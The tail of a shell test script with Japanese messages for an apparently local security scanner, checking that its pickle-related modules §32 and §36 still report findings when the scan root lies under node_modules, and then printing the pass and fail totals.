got="$(run_scan "$N10" full "$FIX/_home" | jq -r --arg r "$N10/" '[.findings[] | select(.module == "§32" or .module == "§36") | "\(.level) \(.module) \(.path | ltrimstr($r)) \(.code)"] | sort | join(",")')"
[ "$got" = "MEDIUM §32 pk2/model.pkl s32.pickle_model,MEDIUM §36 pk2/m.py s36.pickle" ] && ok "node_modules の下の検査ルートでも §32 / §36 を検査（スキップは検査ルートからの相対パスで判定）" || ng "node_modules の下の検査ルートの結果が違う: $got"

echo
echo "結果: PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
